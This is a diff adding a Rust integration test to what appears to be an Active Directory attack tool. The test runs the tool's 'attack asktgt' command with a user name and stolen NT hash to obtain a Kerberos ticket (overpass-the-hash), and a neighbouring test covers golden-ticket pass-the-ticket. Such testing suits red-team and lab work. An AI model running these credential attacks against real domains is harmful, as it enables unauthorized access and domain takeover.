@@ -342,3 +342,31 @@ fn pass_the_ticket_golden_exec() {
         "golden PtT did not run as SYSTEM: {o}"
     );
 }
+
+#[test]
+#[ignore = "live DC"]
+fn overpass_the_hash_gets_tgt() {
+    // RC4-HMAC overpass-the-hash: NT hash → TGT. Needs ADH_OPTH_USER + ADH_OPTH_HASH (32 hex).
+    let (Some(user), Some(hash)) = (env("ADH_OPTH_USER"), env("ADH_OPTH_HASH")) else {
+        return;
+    };
+    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
+    let out = std::env::temp_dir().join("adh_optt.ccache");
+    let Some(o) = run(&[
+        "attack",
+        "asktgt",
+        "--user",
+        &user,
+        "--realm",
+        &realm,
+        "--kdc",
+        &dc(),
+        "--nt-hash",
+        &hash,
+        "--out",
+        out.to_str().unwrap(),
+    ]) else {
+        return;
+    };
+    assert!(o.contains("TGT obtained"), "overpass-the-hash failed:\n{o}");
+}
